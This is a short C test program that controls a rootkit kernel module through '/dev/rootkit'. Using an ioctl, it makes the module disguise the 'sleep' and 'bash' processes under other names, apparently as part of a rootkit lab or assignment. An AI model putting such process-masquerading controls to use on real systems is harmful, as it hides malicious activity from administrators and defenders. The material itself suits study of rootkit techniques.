#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include "rootkit.h"

int main() {
    int fd = open("/dev/rootkit", O_RDWR);
    assert(fd != -1);

    struct masq_proc procs[2];

    strncpy(procs[0].new_name, "very_long_process_name", MASQ_LEN - 1);
    procs[0].new_name[MASQ_LEN - 1] = '\0';
    strncpy(procs[0].orig_name, "sleep", MASQ_LEN - 1);
    procs[0].orig_name[MASQ_LEN - 1] = '\0';

    strncpy(procs[1].new_name, "owo", MASQ_LEN - 1);
    procs[1].new_name[MASQ_LEN - 1] = '\0';
    strncpy(procs[1].orig_name, "bash", MASQ_LEN - 1);
    procs[1].orig_name[MASQ_LEN - 1] = '\0';

    struct masq_proc_req req = {
        .len = 2,
        .list = procs
    };

    assert(ioctl(fd, IOCTL_MOD_MASQ, &req) == 0);
    assert(close(fd) == 0);
    return 0;
}